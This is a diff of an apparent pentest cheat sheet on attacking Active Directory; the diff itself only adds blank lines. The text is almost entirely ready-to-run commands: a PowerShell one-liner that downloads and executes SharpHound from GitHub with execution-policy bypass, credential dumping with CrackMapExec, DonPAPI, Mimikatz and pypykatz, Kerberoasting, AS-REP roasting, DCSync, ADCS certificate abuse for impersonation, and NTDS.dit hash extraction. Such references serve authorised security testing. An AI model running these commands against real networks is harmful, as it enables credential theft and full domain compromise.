@@ -10,6 +10,7 @@ comments: false
 ## Mapping & Enumeration
 
 ### Basic Bloodhound
+
 Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
 ```powershell
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
@@ -28,6 +29,7 @@ sudo neo4j start
 Then execute BloodHound and import the zip file.
 
 ### Extended Bloodhound (PKI)
+
 Best thing to do is to use Certipy to get a bloodhound extract, including everything about ADCS (templates, etc.) :
 ```bash
 certipy find -bloodhound -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
@@ -36,6 +38,7 @@ certipy find -bloodhound -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
 Then, use Olivier Lyak's bloohound, which includes PKIs stuff (<https://github.com/ly4k/BloodHound>). This will give you the opportunity to check for a lot of knows attacks on ADCS (ESC1 to ESC10).
 
 ### Goddi
+
 To get all the important information from the Active Directory :
 ```bash
 ./goddi-linux-amd64 -dc IP_DC -domain=DOMAIN -username=USERNAME -password=PASSWORD -unsafe
@@ -43,6 +46,7 @@ To get all the important information from the Active Directory :
 {: .nolineno }
 
 ## Shares
+
 Dump all shares via CrackMapExec. This can be used on native Kali distribution :
 ```bash
 crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=false
@@ -62,8 +66,11 @@ Find-DomainShare -CheckShareAccess
 ```
 {: .nolineno }
 All the functionalities here : <https://powersploit.readthedocs.io/en/latest/Recon/>
+
 ## Dump credentials
+
 ### CrackMapExec
+
 Many possibilites. Use --local-auth if using a local admin account.
 With lsassy module :
 ```bash
@@ -87,6 +94,7 @@ impacket-getTGT domain.local/username -aesKey AES_KEY -dc-ip DC_IP
 {: .nolineno }
 
 ### DonPAPI
+
 Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :
 ```bash
 python3 DonPAPI.py DOMAIN/USERNAME:PASSWORD@IP_ADDRESS
@@ -114,6 +122,7 @@ cat DonPapiOutput.txt | grep -ae 'Firefox Password' -e 'Chrome Password' | cut -
 {: .nolineno }
 
 ### Mimikatz
+
 On Windows, retrieve password/hash from a dump file :
 ```powershell
 sekurlsa::minidump "XXXXXXXXX.DMP"
@@ -124,22 +133,29 @@ On Kali, use pypykatz based on python :
 pypykatz lsa minidump 'XXX.DMP'
 ```
 {: .nolineno }
+
 ### Others
+
 Native Windows command :
 ```markdown
 rundll32 keymgr.dll, KRShowKeyMgr
 ```
 {: .nolineno }
 Savoir : Mimikatz recompiled in Go lang : <https://github.com/vincd/savoir>
+
 ## Impersonation
+
 To execute commands with another account :
 ```powershell
 $password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
 Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
 ```
+
 ## Kerberos
+
 ### Kerberoast
+
 GetUserSPNs and get hashes :
 ```bash
 impacket-GetUserSPNs -request -dc-ip IP_ADDRESS DOMAIN/USERNAME -outputfile hashes.kerberoast
@@ -150,7 +166,9 @@ If you get hashes, try to crack it and then use DCSync exploit :
 impacket-secretsdump -just-dc-ntlm DOMAIN/USERNAME:PASSWORD@DC_IP
 ```
 {: .nolineno }
+
 ### AS-REP Roasting
+
 Look for users without Kerberos pre-authentication required attribute (using credential, low privilege) :
 ```bash
 impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
@@ -161,7 +179,9 @@ Get a TGT for a user, whithout his password, if you know that this account have 
 impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME -no-pass
 ```
 {: .nolineno }
+
 ### Tips to authenticate with Kerberos while pentesting
+
 If you have a valid username/password, you can ask the KDC for a TGT. It is truly important to use the real domain name and not an alias :
 ```bash
 impacket-getTGT 'domain.local/username:password' -dc-ip DC_IP
@@ -186,6 +206,7 @@ crackmapexec smb IP_ADDRESS/MASK -u 'USERNAME' -k --use-kcache
 {: .nolineno }
 
 ## Active Directory Certificate Services (ADCS)
+
 You can try to find directly vulnerable templates with certipy. Good to use /currentuser option if you only have one valid account :
 ```bash
 certipy find -vulnerable -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
@@ -230,7 +251,9 @@ certipy auth -pfx cert.pfx -dc-ip DC-IP -u ACCOUNT-TO-IMPERSONATE -domain DOMAIN
 You then get the NTLM Hash. Enjoy ;)
 
 ## NTDS Exfiltration
+
 ### Remote extraction using CrackmapExec or Impacket
+
 Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :
 ```bash
 crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -p 'PASSWORD' --ntds
@@ -253,6 +276,7 @@ cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
 {: .nolineno }
 
 ### Extract NTDS from a local NTDS.dit file
+
 If you get a local access to the DC, you have to get NTDS.dit and SYSTEM files in order to extract all the informations. These files are located here :
 ```powershell
 %SYSTEMROOT%\NTDS\ntds.dit
